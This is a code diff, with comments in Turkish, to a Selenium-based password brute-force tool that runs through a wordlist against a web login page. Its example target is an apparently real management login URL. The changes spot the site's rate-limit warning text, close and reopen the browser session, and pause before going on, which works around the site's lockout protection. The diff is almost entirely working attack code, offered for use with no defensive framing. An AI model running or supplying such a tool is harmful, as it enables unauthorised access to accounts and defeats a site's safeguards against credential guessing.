@@ -11,17 +11,17 @@ from webdriver_manager.firefox import GeckoDriverManager
 
 def setup_browser_session(url):
     """
-    Yeni bir tarayıcı oturumu başlatır, sayfayı açar, bekler ve giriş elementlerini bulur.
+    Yeni bir tarayıcı oturumu başlatır, sayfayı açar ve giriş elementlerinin yüklenmesini bekler.
     """
     print("\n[*] Yeni bir tarayıcı oturumu başlatılıyor...")
     service = FirefoxService(GeckoDriverManager().install())
     driver = webdriver.Firefox(service=service)
     
     driver.get(url)
-    print("[*] Sayfa yüklendi. Başlangıç animasyonları için 30 saniye bekleniyor...")
-    time.sleep(30)
     
-    wait = WebDriverWait(driver, 15)
+    # Elementlerin görünür olması için 30 saniyeye kadar bekle.
+    print("[*] Sayfanın ve giriş formunun yüklenmesi bekleniyor (en fazla 30 saniye)...")
+    wait = WebDriverWait(driver, 30)
     
     PASSWORD_SELECTOR = (By.CSS_SELECTOR, "input[type='password']")
     password_field = wait.until(EC.visibility_of_element_located(PASSWORD_SELECTOR))
@@ -32,12 +32,12 @@ def setup_browser_session(url):
     LOGIN_BUTTON_SELECTOR = (By.CSS_SELECTOR, "button[type='submit']")
     login_button = wait.until(EC.element_to_be_clickable(LOGIN_BUTTON_SELECTOR))
     
-    print("[*] Giriş elementleri bulundu.")
+    print("[*] Giriş elementleri bulundu ve sayfa hazır.")
     return driver, username_field, password_field, login_button
 
 
 def main():
-    parser = argparse.ArgumentParser(description='Rate Limit Uyumlu, Gelişmiş Selenium Bruteforce Aracı.')
+    parser = argparse.ArgumentParser(description='Akıllı Rate Limit Tespiti Yapan Bruteforce Aracı.')
     parser.add_argument('url', help='Hedef web sitesinin URL\'si (örn: https://mgmt.yenihavale.net/login)')
     parser.add_argument('-u', '--username', required=True, help='Kullanılacak kullanıcı adı.')
     parser.add_argument('-w', '--wordlist', required=True, help='Denenecek şifrelerin bulunduğu dosya.')
@@ -66,13 +66,14 @@ def main():
 
     current_password_index = 0
     found_password = None
-    driver = None
-
+    
     while current_password_index < len(passwords) and not found_password:
+        driver = None
+        rate_limited = False
         try:
             driver, username_field, password_field, login_button = setup_browser_session(args.url)
             username_field.send_keys(args.username)
-            print(f"[*] Denemelere {current_password_index}. şifreden devam ediliyor...")
+            print(f"[*] Denemelere {current_password_index + 1}. şifreden devam ediliyor...")
 
             for i in range(current_password_index, len(passwords)):
                 password = passwords[i]
@@ -85,6 +86,7 @@ def main():
                 login_button.click()
                 
                 try:
+                    # Başarı durumu: URL'nin 3 saniye içinde değişmesi
                     WebDriverWait(driver, 3).until(lambda d: args.url not in d.current_url)
                     
                     current_url = driver.current_url
@@ -95,21 +97,35 @@ def main():
                     time.sleep(30)
                     break 
                 except TimeoutException:
-                    continue
-
+                    # Giriş başarısız. Şimdi rate limit mesajını kontrol et.
+                    try:
+                        rate_limit_xpath = "//*[contains(text(), 'Çok fazla istek gönderdiniz') or contains(text(), 'daha sonra tekrar deneyiniz')]"
+                        WebDriverWait(driver, 1).until(EC.visibility_of_element_located((By.XPATH, rate_limit_xpath)))
+                        
+                        # Rate limit mesajı bulundu.
+                        print("\n[!] Rate limit mesajı tespit edildi! Oturum yeniden başlatılacak.")
+                        rate_limited = True
+                        break # İç döngüden çık ve oturumu yeniden başlat.
+                    except TimeoutException:
+                        # Rate limit mesajı yok, normal hatalı şifre. Devam et.
+                        continue
+        
         except Exception as e:
-            print(f"\n[!] Oturumda bir hata oluştu (Muhtemel Rate Limit): {type(e).__name__}")
-            current_password_index += 1
-
+            print(f"\n[!] Oturumda beklenmedik bir hata oluştu ({type(e).__name__}). Oturum yeniden başlatılacak.")
+            
         finally:
             if driver:
                 driver.quit()
                 print("[*] Tarayıcı oturumu kapatıldı.")
         
-        if not found_password and current_password_index < len(passwords):
-            print("[!] Rate limit için 60 saniye bekleniyor...")
-            time.sleep(60)
+        if found_password:
+            break
 
+        if rate_limited or (not found_password and current_password_index < len(passwords)):
+            # Eğer rate limit olduysa veya başka bir hatadan dolayı döngü kırıldıysa, bekle.
+            print("[!] Yeni oturumdan önce 30 saniye bekleniyor...")
+            time.sleep(30)
+    
     if not found_password:
         print("\n[-] Tüm denemeler bitti. Şifre bulunamadı.")
     
